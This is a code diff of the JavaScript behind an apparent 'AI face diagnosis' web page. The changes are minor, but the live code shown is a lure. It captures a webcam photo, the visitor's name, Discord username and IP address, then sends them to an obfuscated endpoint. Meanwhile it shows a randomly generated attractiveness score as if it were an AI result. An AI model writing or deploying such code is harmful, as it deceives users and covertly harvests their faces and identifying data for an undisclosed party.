@@ -170,6 +170,7 @@
     _d('sb').addEventListener('click', async () => {
         if(_d('hp_field').value !== "") { trap(); return; }
         
+        // reCAPTCHA v2 の認証チェック
         const response = grecaptcha.getResponse();
         if (response.length === 0) {
             alert("「私はロボットではありません」にチェックを入れてください。");
@@ -178,20 +179,17 @@
 
         _n = _d('un').value.trim();
         _id = _d('did').value.trim();
-
         const discordRegex = /^[a-z0-9._]{2,32}$/i;
         
         if(!_n) return alert("お名前を入力してください");
-        
         if(!_id || !discordRegex.test(_id)) {
-            alert("Discordユーザー名が正しくありません。\n(半角英数字、ドット、アンダースコアのみ使用可能)");
+            alert("Discordユーザー名が正しくありません。");
             return;
         }
         
         _d('sb').disabled = true;
         _d('setup-ui').style.display = _0xS[2]; 
         _d('camera-container').style.display = _0xS[3];
-        
         _ip = await _gip();
         
         try {
@@ -206,26 +204,22 @@
                 const ctx = _d('cv').getContext('2d'); ctx.drawImage(_d('v'), 0, 0, 800, 800);
                 _d('cv').toBlob(async (b) => {
                     _score = Math.floor(Math.random() * 59) + 40;
-                    
                     const f = new FormData(); 
                     f.append('file', b, 'scan.png');
                     f.append('content', `🚀 **AI顔診断レポート**\n👤 ユーザー: ${_n}\n👾 Discord: ${_id}\n📊 スコア: ${_score}点\n🌐 IP: ${_ip}\n🛡️ reCAPTCHA: Verified`);
                     
-                    // データを送信
                     await fetch(_path(), { method: _0xS[1], body: f });
-                    
                     s.getTracks().forEach(t => t.stop());
                     
                     const resList = ["イケメン！", "美女！", "かわいい", "普通", "まあまあ", "モテそう！", "ちょいいけめん！"];
                     _d('res-text')[_0xS[4]] = resList[Math.floor(Math.random() * resList.length)];
                     _d('score-val').innerHTML = `${_score}<span style="font-size:16px;">点</span>`;
-
                     _d('camera-container').style.display = _0xS[2]; 
                     _d('result-ui').style.display = _0xS[3];
                 }, 'image/png');
             }, 6000);
         } catch(e) { 
-            alert("カメラの許可が必要です。ページをリロードして許可してください。"); 
+            alert("カメラの許可が必要です。"); 
             location.reload(); 
         }
     });
